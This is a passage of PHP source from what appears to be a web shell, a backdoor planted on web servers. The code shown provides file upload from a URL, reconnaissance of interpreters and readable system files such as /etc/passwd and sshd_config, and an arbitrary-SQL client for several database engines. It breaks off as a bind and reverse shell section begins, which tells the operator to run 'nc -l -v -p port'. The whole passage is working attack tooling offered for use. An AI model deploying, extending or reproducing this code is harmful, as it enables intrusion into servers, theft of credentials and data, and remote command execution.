			<tr><td style=\"width:100px;\">File URL</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"fileurl\" value=\"\" />
			</td></tr>
			<tr><td>Save to</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"savefolderurl\" value=\"".$cwd."\" /></td></tr>
			<tr><td>Filename (optional)</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"savefilenameurl\" value=\"\" /></td></tr>
			<tr><td>&nbsp;</td><td>
			<input type=\"submit\" name=\"uploadurl\" class=\"inputzbut\" value=\"Upload !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
			</td></tr>
			<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
			</table>
			</div>
			</form>
			";
	} // show server information
	elseif(isset($_REQUEST['info'])){
		// access to compiler/interpreter
		$s_python = check_access("python");
		$s_perl = check_access("perl");
		$s_ruby = check_access("ruby");
		$s_gcc = check_access("gcc");
		$s_java = check_access("java");

		$s_result = "";
		// server misc info
		$s_result .= "<p class=\"rs_result\" onclick=\"toggle('info_server')\">Server Info</p>";
		$s_result .= "<div class=\"info\" id=\"info_server\"><table>";

		$s_result .= "<tr><td>php</td><td>".phpversion()."</td></tr>";
		if($s_python) $s_result .= "<tr><td>python</td><td>".exe("python -V")."</td></tr>";
		if($s_perl)	$s_result .= "<tr><td>perl</td><td>".exe("perl -e \"print \$]\"")."</td></tr>";
		if($s_ruby)	$s_result .= "<tr><td>ruby</td><td>".exe("ruby -v")."</td></tr>";
		if($s_gcc){
			$gcc_version = exe("gcc --version");
			$gcc_ver = explode("\n",$gcc_version);
			if(count($gcc_ver)>0) $gcc_ver = $gcc_ver[0];
			$s_result .= "<tr><td>gcc</td><td>".$gcc_ver."</td></tr>";
		}
		if($s_java) $s_result .= "<tr><td>java</td><td>".str_replace("\n", ", ", exe("java -version"))."</td></tr>";
		if(is_file("/etc/passwd") && is_readable("/etc/passwd")) $s_result .= "<tr><td>/etc/passwd</td><td><a href=\"".$_SERVER['PHP_SELF']."?view=/etc/passwd\">/etc/passwd is readable</a></td></tr>";
		if(is_file("/etc/issue") && is_readable("/etc/issue")) $s_result .= "<tr><td>/etc/issue</td><td><a href=\"".$_SERVER['PHP_SELF']."?view=/etc/issue\">/etc/issue is readable</a></td></tr>";
		if(is_file("/etc/ssh/sshd_config") && is_readable("/etc/ssh/sshd_config")) $s_result .= "<tr><td>/etc/ssh/sshd_config</td><td><a href=\"".$_SERVER['PHP_SELF']."?view=/etc/ssh/sshd_config\">/etc/ssh/sshd_config is readable</a></td></tr>";
			
		$s_result .= "</table></div>";

		if(!$s_win){
			// cpu info		
			if($i_buff=trim(file_get_contents("/proc/cpuinfo"))){
				$s_result .= "<p class=\"rs_result\" onclick=\"toggle('info_cpu')\">CPU Info</p>";
				$s_result .= "<div class=\"info\" id=\"info_cpu\">";
				$i_buffs = explode("\n\n", $i_buff);
				foreach($i_buffs as $i_buffss){
					$i_buffss = trim($i_buffss);
					if($i_buffss!=""){
						$i_buffsss = explode("\n",$i_buffss);
						$s_result .= "<table>";
						foreach($i_buffsss as $i){
							$i = trim($i);
							if($i!=""){
								$ii = explode(":",$i);
								if(count($ii)==2) $s_result .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
							}
						}
						$s_result .= "</table>";
					}
				}
				$s_result .= "</div>";
			}
			// mem info		
			if($i_buff=trim(file_get_contents("/proc/meminfo"))){
				$s_result .= "<p class=\"rs_result\" onclick=\"toggle('info_mem')\">Memory Info</p>";
				$i_buffs = explode("\n",$i_buff);
				$s_result .= "<div class=\"info\" id=\"info_mem\"><table>";
				foreach($i_buffs as $i){
					$i = trim($i);
					if($i!=""){
						$ii = explode(":",$i);
						if(count($ii)==2) $s_result .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
					}
					else $s_result .= "</table><table>";
				}
				$s_result .= "</table></div>";
			}
			// partition
			if($i_buff=trim(file_get_contents("/proc/partitions"))){
				$i_buff = preg_replace("/\ +/"," ",$i_buff);
				$s_result .= "<p class=\"rs_result\" onclick=\"toggle('info_part')\">Partitions Info</p>";
				$s_result .= "<div class=\"info\" id=\"info_part\">";
				$i_buffs = explode("\n\n", $i_buff);
				$s_result .= "<table><tr>";
				$i_head = explode(" ",$i_buffs[0]);
				foreach($i_head as $h) $s_result .= "<th>".$h."</th>";
				$s_result .= "</tr>";
				$i_buffss = explode("\n", $i_buffs[1]);
				foreach($i_buffss as $i_b){
					$i_row = explode(" ",trim($i_b));
					$s_result .= "<tr>";
					foreach($i_row as $r) $s_result .= "<td style=\"text-align:center;\">".$r."</td>";
					$s_result .= "</tr>";
				}
				$s_result .= "</table>";
				$s_result .= "</div>";
			}
		}
		$phpinfo = array(
			"PHP General" => INFO_GENERAL,
			"PHP Configuration" => INFO_CONFIGURATION,
			"PHP Modules" => INFO_MODULES,
			"PHP Environment" => INFO_ENVIRONMENT,
			"PHP Variables" => INFO_VARIABLES
		);
		foreach($phpinfo as $p=>$i){
			$s_result .= "<p class=\"rs_result\" onclick=\"toggle('".$i."')\">".$p."</p>";
			ob_start();
			eval("phpinfo(".$i.");");
			$b = ob_get_contents();
			ob_end_clean();
			$a = strpos($b,"<body>")+6;
			$z = strpos($b,"</body>");
			$body = substr($b,$a,$z-$a);
			$body = str_replace(",",", ",$body);
			$body = str_replace(";","; ",$body);
			$s_result .= "<div class=\"info\" id=\"".$i."\">".$body."</div>";	
		}
	} // working with database
	elseif(isset($_REQUEST['db'])){
		// sqltype : mysql, mssql, oracle, pgsql, odbc, pdo
		$sqlhost = isset($_REQUEST['sqlhost'])? ss($_REQUEST['sqlhost']) : "localhost";
		$sqlport = isset($_REQUEST['sqlport'])? ss($_REQUEST['sqlport']) : "";
		$sqluser = isset($_REQUEST['sqluser'])? ss($_REQUEST['sqluser']) : "";
		$sqlpass = isset($_REQUEST['sqlpass'])? ss($_REQUEST['sqlpass']) : "";
		$odbcdsn = isset($_REQUEST['odbcdsn'])? ss($_REQUEST['odbcdsn']) : "";
		$odbcuser = isset($_REQUEST['odbcuser'])? ss($_REQUEST['odbcuser']) : "";
		$odbcpass = isset($_REQUEST['odbcpass'])? ss($_REQUEST['odbcpass']) : "";
		$pdodsn = isset($_REQUEST['pdodsn'])? ss($_REQUEST['pdodsn']) : "";
		$pdouser = isset($_REQUEST['pdouser'])? ss($_REQUEST['pdouser']) : "";
		$pdopass = isset($_REQUEST['pdopass'])? ss($_REQUEST['pdopass']) : "";
		$sqlite_file = isset($_REQUEST['sqlite_file'])? ss($_REQUEST['sqlite_file']) : "";
		
		$sqls = "";
		$q_result = "";
		$hostandport = $sqlhost;
		if(trim($sqlport)!="") $hostandport = $sqlhost.":".$sqlport;
		
		$sqlform_tpl = "<form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
					<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" />
					<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" />
					<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" />
					<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" />
					<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
					<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">__sqlcode__</textarea>
					<p><input type=\"submit\" name=\"__sqltype__\" class=\"inputzbut\" value=\"Go !\" style=\"width:120px;height:30px;\" />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
					</form>";
		
		if(isset($_REQUEST['mysql']) && ($con = mysql_connect($hostandport,$sqluser,$sqlpass))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = mysql_query($query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=0;$i<mysql_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(mysql_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";
						while($rows=mysql_fetch_array($hasil)){
							$q_result .= "<tr>";
							for($j=0;$j<mysql_num_fields($hasil);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "SHOW databases;";

			$s_result .= str_replace("__sqltype__","mysql",str_replace("__sqlcode__", $sqls, $sqlform_tpl));
			$s_result .= "<div>".$q_result."</div>";
			if($con) mysql_close($con);
		}
		elseif(isset($_REQUEST['mssql']) && ($con = mssql_connect($hostandport,$sqluser,$sqlpass))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = mssql_query($query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=0;$i<mssql_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(mssql_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";
						while($rows=mssql_fetch_array($hasil)){
							$q_result .= "<tr>";
							for($j=0;$j<mssql_num_fields($hasil);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "SELECT name FROM master..sysdatabases;";

			$s_result .= str_replace("__sqltype__","mssql",str_replace("__sqlcode__", $sqls, $sqlform_tpl));
			$s_result .= "<div>".$q_result."</div>";
			if($con) mssql_close($con);
		}
		elseif(isset($_REQUEST['sqlsrv']) && ($con = sqlsrv_connect($hostandport,$sqluser,$sqlpass))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = sqlsrv_query($query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=0;$i<sqlsrv_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(sqlsrv_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";
						while($rows=sqlsrv_fetch_array($hasil)){
							$q_result .= "<tr>";
							for($j=0;$j<sqlsrv_num_fields($hasil);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "SELECT name FROM master..sysdatabases;";

			$s_result .= str_replace("__sqltype__","sqlsrv",str_replace("__sqlcode__", $sqls, $sqlform_tpl));
			$s_result .= "<div>".$q_result."</div>";
			if($con) sqlsrv_close($con);
		}
		elseif(isset($_REQUEST['oracle']) && ($con = oci_connect($sqluser,$sqlpass,$hostandport))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$st = oci_parse($con, $query);
					if(oci_execute($st)){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=1;$i<=oci_num_fields($st);$i++)
							$q_result .= "<th>".htmlspecialchars(oci_field_name($st,$i))."</th>";

						$q_result .= "</tr>";

						while($rows=oci_fetch_array($st)){
							$q_result .= "<tr>";
							for($j=0;$j<oci_num_fields($st);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME;";

			$s_result .= str_replace("__sqltype__","oracle",str_replace("__sqlcode__", $sqls, $sqlform_tpl));
			$s_result .= "<div>".$q_result."</div>";
			if($con) oci_close($con);
		}
		elseif(isset($_REQUEST['pgsql']) && ($con = pg_connect("host=$sqlhost user=$sqluser password=$sqlpass port=$sqlport"))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = pg_query($query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=0;$i<pg_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(pg_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";

						while($rows=pg_fetch_array($hasil)){
							$q_result .= "<tr>";
							for($j=0;$j<pg_num_fields($hasil);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "SELECT schema_name FROM information_schema.schemata;";

			$s_result .= str_replace("__sqltype__","pgsql",str_replace("__sqlcode__", $sqls, $sqlform_tpl));
			$s_result .= "<div>".$q_result."</div>";
			if($con) pg_close($con);
		}
		elseif(isset($_REQUEST['sqlite']) && ($con = sqlite_open($sqlite_file))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = sqlite_query($con, $query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=0;$i<sqlite_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(sqlite_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";

						while($rows=sqlite_fetch_array($hasil)){
							$q_result .= "<tr>";
							for($j=0;$j<sqlite_num_fields($hasil);$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "SELECT name FROM sqlite_master WHERE type='table';";

			$s_result .= "	<form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
					<input type=\"hidden\" name=\"sqlite_file\" value=\"".$sqlite_file."\" />
					<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
					<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">".$sqls."</textarea>
					<p><input type=\"submit\" name=\"sqlite\" class=\"inputzbut\" value=\"Go !\" style=\"width:120px;height:30px;\" />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
					</form>";
			$s_result .= "<div>".$q_result."</div>";
			if($con) sqlite_close($con);
		}
		elseif(isset($_REQUEST['sqlite3']) && ($con = new SQLite3($sqlite_file))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = $con->query($query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=0;$i<$hasil->numColumns();$i++)
							$q_result .= "<th>".htmlspecialchars($hasil->columnName($i))."</th>";
						$q_result .= "</tr>";

						while($rows=$hasil->fetchArray()){
							$q_result .= "<tr>";
							for($j=0;$j<$hasil->numColumns();$j++)
							{
								if($rows[$j] == "") $dataz = " ";
								else $dataz = $rows[$j];
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "SELECT name FROM sqlite_master WHERE type='table';";

			$s_result .= "	<form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
					<input type=\"hidden\" name=\"sqlite_file\" value=\"".$sqlite_file."\" />
					<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
					<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">".$sqls."</textarea>
					<p><input type=\"submit\" name=\"sqlite3\" class=\"inputzbut\" value=\"Go !\" style=\"width:120px;height:30px;\" />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
					</form>";
			$s_result .= "<div>".$q_result."</div>";
			if($con) $con->close();
		}
		elseif(isset($_REQUEST['odbc']) && ($con = odbc_connect($odbcdsn,$odbcuser,$odbcpass))){
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
				  if(trim($query) != ""){
					$hasil = odbc_exec($con, $query);
					if($hasil){
						$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
						<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
						<table class=\"explore\" style=\"width:99%;\"><tr>";
						for($i=1;$i<=odbc_num_fields($hasil);$i++)
							$q_result .= "<th>".htmlspecialchars(odbc_field_name($hasil,$i))."</th>";
						$q_result .= "</tr>";

						while($rows=odbc_fetch_array($hasil)){
							$q_result .= "<tr>";
							foreach($rows as $r)
							{
								if($r == "") $dataz = " ";
								else $dataz = $r;
								$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
							}
							$q_result .= "</tr>";
						}
						$q_result .= "</table>";
					}
					else $q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
				  }
				}
			}
			else $sqls = "";

			$s_result .= "	<form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
					<input type=\"hidden\" name=\"odbcdsn\" value=\"".$odbcdsn."\" />
					<input type=\"hidden\" name=\"odbcuser\" value=\"".$odbcuser."\" />
					<input type=\"hidden\" name=\"odbcpass\" value=\"".$odbcpass."\" />
					<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
					<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">".$sqls."</textarea>
					<p><input type=\"submit\" name=\"odbc\" class=\"inputzbut\" value=\"Go !\" style=\"width:120px;height:30px;\" />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
					</form>";
			$s_result .= "<div>".$q_result."</div>";
			if($con) odbc_close($con);
		}
		elseif(isset($_REQUEST['pdo'])){
			// create object
			$mypdo = new PDO($pdodsn,$pdouser,$pdopass);
			if(isset($_REQUEST['sqlcode'])){
				$sqls = ss($_REQUEST['sqlcode']);
				$querys = explode(";",$sqls);

				foreach($querys as $query){
					if(trim($query) != ""){

						if($hasil = $mypdo->query($query)){
							$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
							<span class=\"gaya\">[</span> ok <span class=\"gaya\">]</span></p>
							<table class=\"explore\" style=\"width:99%;\"><tr>";
							// workaround to get column name
							$r = $hasil->fetch(2);
							$savefirstrow = array();
							foreach($r as $fn=>$fv){
								$q_result .= "<th>".htmlspecialchars($fn)."</th>";
								$savefirstrow[] = $fv;
							}
							$q_result .= "</tr><tr>";
							foreach($savefirstrow as $fv){
								$q_result .= "<td>".htmlspecialchars($fv)."</td>";
							}
							$q_result .= "</tr>";
							while($rows = $hasil->fetch(2)){
								$q_result .= "<tr>";
								foreach($rows as $r)
								{
									if($r == "") $dataz = " ";
									else $dataz = $r;
									$q_result .= "<td>".htmlspecialchars($dataz)."</td>";
								}
								$q_result .= "</tr>";
							}
							$q_result .= "</table>";
						}
						else{

							$q_result .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;
									<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>";
						}
						$q_result .= "</table>";
					}
				}
			}
			else $sqls = "";
			
			$s_result .= "	<form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\">
				<input type=\"hidden\" name=\"pdodsn\" value=\"".$pdodsn."\" />
				<input type=\"hidden\" name=\"pdouser\" value=\"".$pdouser."\" />
				<input type=\"hidden\" name=\"pdopass\" value=\"".$pdopass."\" />
				<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
				<textarea id=\"sqlcode\" name=\"sqlcode\" class=\"evalcode\" style=\"height:10em;\">".$sqls."</textarea>
				<p><input type=\"submit\" name=\"pdo\" class=\"inputzbut\" value=\"Go !\" style=\"width:120px;height:30px;\" />
				&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class=\"gaya\">[</span> ; <span class=\"gaya\">]</span></p>
				</form>";
				$s_result .= "<div>".$q_result."</div>";
		}
		else{
			// sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
			$sqllist = array();
			if(function_exists("mysql_connect")) $sqllist["mysql"] = "connect to MySQL <span style=\"font-size:12px;color:#999;\">- using mysql_*</span>";
			if(function_exists("mssql_connect")) $sqllist["mssql"] = "connect to MsSQL <span style=\"font-size:12px;color:#999;\">- using mssql_*</span>";
			if(function_exists("sqlsrv_connect")) $sqllist["sqlsrv"] = "connect to MsSQL <span style=\"font-size:12px;color:#999;\">- using sqlsrv_*</span>";
			if(function_exists("pg_connect")) $sqllist["pgsql"] = "connect to PostgreSQL <span style=\"font-size:12px;color:#999;\">- using pg_*</span>";
			if(function_exists("oci_connect")) $sqllist["oracle"] = "connect to oracle <span style=\"font-size:12px;color:#999;\">- using oci_*</span>";
			if(function_exists("sqlite_open")) $sqllist["sqlite"] = "connect to SQLite <span style=\"font-size:12px;color:#999;\">- using sqlite_*</span>";
			if(class_exists("SQLite3")) $sqllist["sqlite3"] = "connect to SQLite3 <span style=\"font-size:12px;color:#999;\">- using class SQLite3</span>";
			if(function_exists("odbc_connect")) $sqllist["odbc"] = "connect via ODBC <span style=\"font-size:12px;color:#999;\">- using odbc_*</span>";
			if(class_exists("PDO")) $sqllist["pdo"] = "connect via PDO <span style=\"font-size:12px;color:#999;\">- using class PDO</span>";
			
			foreach($sqllist as $sqltype=>$sqltitle){
				if($sqltype=="odbc"){
					$s_result .= "<div class=\"mybox\"><h2>".$sqltitle."</h2>
					<form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\" />
					<table class=\"myboxtbl\">
					<tr><td style=\"width:170px;\">DSN / Connection String</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"odbcdsn\" value=\"".$odbcdsn."\" /></td></tr>
					<tr><td>Username</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"odbcuser\" value=\"".$odbcuser."\" /></td></tr>
					<tr><td>Password</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"password\" name=\"odbcpass\" value=\"\" /></td></tr>
					</table>
					<input type=\"submit\" name=\"".$sqltype."\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
					<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
					</form>
					</div>";
				}
				elseif($sqltype=="pdo"){
					$s_result .= "<div class=\"mybox\"><h2>".$sqltitle."</h2>
					<form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\" />
					<table class=\"myboxtbl\">
					<tr><td style=\"width:170px;\">DSN / Connection String</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"pdodsn\" value=\"".$pdodsn."\" /></td></tr>
					<tr><td>Username</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"pdouser\" value=\"".$pdouser."\" /></td></tr>
					<tr><td>Password</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"password\" name=\"pdopass\" value=\"\" /></td></tr>
					</table>
					<input type=\"submit\" name=\"".$sqltype."\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
					<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
					</form>
					</div>";
				}
				elseif($sqltype=="sqlite" || $sqltype=="sqlite3"){
					$s_result .= "<div class=\"mybox\"><h2>".$sqltitle."</h2>
					<form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\" />
					<table class=\"myboxtbl\">
					<tr><td style=\"width:170px;\">DB File</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlite_file\" value=\"".$sqlite_file."\" /></td></tr>
					</table>
					<input type=\"submit\" name=\"".$sqltype."\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
					<input type=\"hidden\" name=\"d\" value=\"".$cwd."\" />
					</form>
					</div>";
				}
				else{
					$s_result .= "<div class=\"mybox\"><h2>".$sqltitle."</h2>
					<form action=\"" . $_SERVER['PHP_SELF'] . "?db\" method=\"post\" />
					<table class=\"myboxtbl\">
					<tr><td style=\"width:170px;\">Host</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlhost1\" value=\"".$sqlhost."\" /></td></tr>
					<tr><td>Username</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqluser\" value=\"".$sqluser."\" /></td></tr>
					<tr><td>Password</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"password\" name=\"sqlpass\" value=\"\" /></td></tr>
					<tr><td>Port (optional)</td><td><input style=\"width:100%;\" class=\"inputz\" type=\"text\" name=\"sqlport\" value=\"".$sqlport."\" /></td></tr>
					</table>
					<input type=\"submit\" name=\"".$sqltype."\" class=\"inputzbut\" value=\"Connect !\" style=\"width:120px;height:30px;margin:10px 2px 0 2px;\" />
					</form>
					</div>";
				}
			}
		
		}
	} // bind and reverse shell
	elseif(isset($_REQUEST['rs'])){
		// access to compiler/interpreter
		$s_python = check_access("python");
		$s_perl = check_access("perl");
		$s_ruby = check_access("ruby");
		$s_gcc = check_access("gcc");
		$s_java = check_access("java");
		//$s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
		//$s_my_ip = $_SERVER['REMOTE_ADDR'];
		$rshost = $s_server_ip;

		$rsport = "13123";
		// resources $rs_pl $rs_py $rs_rb $rs_c $rs_win
		$rspesana = "Press &#39;  Go !  &#39; button and run &#39;  nc <i>server_ip</i> <i>port</i>  &#39; on your computer";
		$rspesanb = "Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button";

		//bind_pl bind_py bind_rb bind_c bind_win bind_php back_pl back_py back_rb back_c back_win back_php
		// resources $rs_pl $rs_py $rs_rb $rs_c $rs_win $rs_php
		$rsbind = array();
		$rsback = array();
		
		
		$rsbind["bind_php"] = "Bind Shell <span style=\"font-size:12px;color:#999;\">- php</span>";
